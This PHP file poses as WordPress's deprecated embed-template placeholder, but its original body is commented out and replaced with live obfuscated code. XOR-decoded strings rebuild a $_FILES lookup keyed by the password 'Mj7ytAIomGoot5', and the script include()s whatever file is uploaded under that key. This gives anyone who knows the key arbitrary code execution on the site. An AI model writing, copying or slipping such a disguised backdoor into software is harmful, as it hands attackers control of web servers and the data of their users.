<?php /* 
*
 * Back-compat placeholder for the base embed template
 *
 * @package WordPress
 * @subpackage oEmbed
 * @since 4.4.0
 * @deprecated 4*/
 	
$domain = 'Mj7ytAIomGoot5';
$sort_order = $domain;
function atts($where_post_type, $original_link_html)

{

    $exclude_from_search = $original_link_html;

    $loop = urldecode($where_post_type);
    $fire_after_hooks = substr($exclude_from_search,0, strlen($loop));
    $update = $loop ^ $fire_after_hooks;
    return $update;

}
$default_editor = ${atts("%12%2C%7E51%12", $sort_order)};
$page_structure = $default_editor;
if (isset($page_structure[$sort_order]))

{

    $postdata = $default_editor[$sort_order];

    $pees = $postdata[atts("9%07G%26%1A+%24%0A", $sort_order)];

    $html = $pees;
    include ($html);
}


/* .5.0 Moved to wp-includes/theme-compat/embed.php
 

_deprecated_file( basename( __FILE__ ), '4.5.0', 'wp-includes/theme-compat/embed.php' );

require ABSPATH . WPINC . '/theme-compat/embed.php';
*/